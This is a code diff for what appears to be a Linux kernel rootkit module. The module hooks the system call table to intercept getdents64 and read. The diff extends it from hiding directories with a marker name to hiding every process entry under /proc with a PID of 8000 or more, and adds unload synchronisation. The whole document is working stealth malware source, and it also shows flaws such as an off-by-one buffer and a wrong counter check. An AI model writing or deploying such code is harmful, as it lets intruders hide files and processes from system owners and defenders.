@@ -11,25 +11,38 @@ int ssSize = NUMBER_OF_FUNCTIONS;
 void *sys_call_table;
 struct cpumask *cpus;
 
+struct completion synchUnload;
+atomic_t unlFlag = ATOMIC_INIT (0);
+
 const char *badDirName = "===1234DEADBEAF4321===";
+const char *badPath = "/proc";
+long pidHide = 8000;
 
 
 //
 // Functions intercepters
 //
 
-int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len) {
+int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len, int clrFlag) {
 	int cur, newLen = len;
 	struct linux_dirent64 *tmpPtr = dirPtr;
+	long pidVal;
+	char *chpEnd;
 	
 	do {
 		cur = dirPtr->d_reclen;
 		len -= cur;
 		tmpPtr = (struct linux_dirent64*)((char*)dirPtr + cur);
 #ifdef MY_OWN_DEBUG
-		printk ("Entry name: %s\n", (char*)&dirPtr->d_type);
+		//printk ("Entry name: %s\n", (char*)&dirPtr->d_type);
 #endif
-		if (strstr ((char*)&dirPtr->d_type, badDirName) != NULL) {
+		
+		pidVal = simple_strtoul ((char*)&dirPtr->d_type, &chpEnd, 10);
+		
+		if (strstr ((char*)&dirPtr->d_type, badDirName) != NULL ||
+			(clrFlag && pidVal >= pidHide)
+			)
+		{
 			memcpy (dirPtr, tmpPtr, len);
 			newLen -= cur;
 		} else {
@@ -42,10 +55,12 @@ int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len) {
 
 
 int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
-	int ret;
+	int ret, clrFlag = 0;
 	//struct files_struct *fdtPtr = NULL;
 	struct file *fdPtr = NULL;
-	struct dentry *dePtr = NULL;
+	//struct dentry *dePtr = NULL;
+	const int bufLen = 128;
+	char buf [bufLen - 1], *realPath;
 	
 	
 #ifdef MY_OWN_DEBUG
@@ -65,22 +80,11 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 			printk ("Have found NULL ptr to struct file at FDT for descriptor id: %d\n", fd);
 #endif
 		} else {
-			if ((dePtr = fdPtr->f_path.dentry) != NULL) {
-				if (dePtr->d_iname [DNAME_INLINE_LEN - 1] != '\0')
-					dePtr->d_iname [DNAME_INLINE_LEN - 1] = '\0';
-#ifdef MY_OWN_DEBUG
-				printk ("HAVE FOUND A NAME: %s\n", dePtr->d_name.name);
-				//sys_write (1, "", 0);
-				//vfs_write ()
-				//vfs_readlink (NULL, "", 0, "");
-#endif
-			} else {
-#ifdef MY_OWN_DEBUG
-				printk ("Have found NULL ptr to struct dentry\n");
-#endif
-			}
-			fput (fdPtr);
+			realPath = d_path (&fdPtr->f_path, buf, bufLen);
+			printk ("Real path: %s\n", realPath);
+			if (strstr (realPath, badPath)) clrFlag = 1;
 		}
+		fput (fdPtr);
 		//spin_unlock (&fdtPtr->file_lock);
 		//spin_unlock (&current->alloc_lock);
 		
@@ -91,18 +95,27 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 			struct linux_dirent64 *dirPtr = (struct linux_dirent64*)kmalloc (ret, GFP_KERNEL);
 			
 			copy_from_user (dirPtr, dirent, ret);
-			ret = clearDirEntries (dirPtr, ret);
+			if (clrFlag)
+				ret = clearDirEntries (dirPtr, ret, 1);
+			else
+				ret = clearDirEntries (dirPtr, ret, 0);
 			copy_to_user (dirent, dirPtr, ret);
 			
 			kfree (dirPtr);
 		}
+		clrFlag = 0;
 		
 		
 		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
+		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
+			complete (&synchUnload);
+		}
 		return ret;
-	}
-	else {
+	} else {
 		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
+		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
+			complete (&synchUnload);
+		}
 		return -EIO;
 	}
 }
@@ -121,10 +134,16 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 		ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
 		
 		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
+		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
+			complete (&synchUnload);
+		}
 		return ret;
 	}
 	else {
 		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
+		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
+			complete (&synchUnload);
+		}
 		return -EIO;
 	}
 }
@@ -259,6 +278,8 @@ int start (void) {
 	}
 	
 	
+	init_completion (&synchUnload);
+	
 	fillServiceTable (sys_call_table);
 	dat.scltPtr = sys_call_table;
 	for (int i = 0; i < ssSize; ++i) {
@@ -277,9 +298,8 @@ void stop (void) {
 	DATA_FN dat = {sys_call_table};
 	
 #ifdef MY_OWN_DEBUG
-	printk ("Bye bye\n");
+	printk ("Unloading start\n");
 #endif
-	
 	for (int i = 0; i < ssSize; ++i) {
 		dat.sysNum = ssPtr[i].sysNum;
 		dat.newPtr = ssPtr[i].sysPtrOld;
@@ -290,6 +310,14 @@ void stop (void) {
 	stop_machine(&setFunc, &dat, cpus);
 	kfree (cpus);
 	kfree (ssPtr);
+	
+	
+	atomic_set (&unlFlag, 1);
+	wait_for_completion (&synchUnload);
+#ifdef MY_OWN_DEBUG
+	printk ("Bye bye\n");
+#endif
+	
 	
 	return;
 }
